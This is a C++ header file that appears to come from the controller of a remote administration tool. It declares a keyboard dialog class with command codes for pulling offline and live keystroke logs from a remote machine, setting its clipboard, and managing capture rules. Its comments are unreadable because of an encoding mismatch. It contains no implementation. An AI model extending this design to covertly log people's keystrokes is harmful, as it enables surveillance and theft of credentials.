#pragma once

// CKeyBoardDlg �Ի���
enum
{
	COMMAND_KEYBOARD_GETOFFLINE,
	COMMAND_KEYBOARD_DEL,
	COMMAND_KEYBOARD_OLKEYLOG_START,
	COMMAND_KEYBOARD_SET_CLIPBOARD_DIF,
	COMMAND_KEYBOARD_OLKEYLOG_CLOSE,
	COMMAND_KEYBOARD_REGEX_SETRULE,
	COMMAND_KEYBOARD_REGEX_DELRULE,

	TOKEN_KEYBOARD_OFFLINEDATA,
	TOKEN_KEYBOARD_OFFLINEDATA_ERROR,
	TOKEN_KEYBOARD_ONLINEDATA,
	TOKEN_KEYBOARD_CLIPBOARD,
};

class CKeyBoardDlg : public CXTPResizeDialog
{

	//DECLARE_DYNAMIC(CKeyBoardDlg)

public:
	CKeyBoardDlg(CWnd* pParent = NULL, ISocketBase* IOCPServer = NULL, ClientContext* ContextObject = NULL);   // ��׼���캯��
//	virtual ~CKeyBoardDlg();
	ClientContext* m_pContext;
	ISocketBase* m_iocpServer;
	HICON          m_hIcon;
	CEdit m_edit_offline;
	void CKeyBoardDlg::OnReceiveComplete(void);
	void OnReceive();
	// �Ի�������
	enum {IDD = IDD_KEYBOARD};

protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV ֧��
	virtual void PostNcDestroy(); 
	virtual void OnCancel();
	DECLARE_MESSAGE_MAP()
public:
	BOOL m_bOnClose;
	virtual BOOL OnInitDialog();
	//afx_msg void OnClose();
	afx_msg void OnBnClickedButtonGet();
	afx_msg void OnBnClickedButtonDel();
	afx_msg void OnBnClickedButtonBackup();
	CEdit m_edit_online;
	CEdit m_edit_clipboard;
	afx_msg void OnBnClickedButtonOpen();
	afx_msg void OnBnClickedButtonSetClipboard();
	void SendLocalClipboard();
	CString CSClipboard;
	afx_msg void OnBnClickedButtonClose();
	CString CStip;
	afx_msg void OnBnClickedButtonSaveRegex();
	afx_msg void OnBnClickedButtonGetRegex();
	afx_msg void OnBnClickedButtonDelRegex();
	afx_msg void OnBnClickedButtonSetRegex();

};





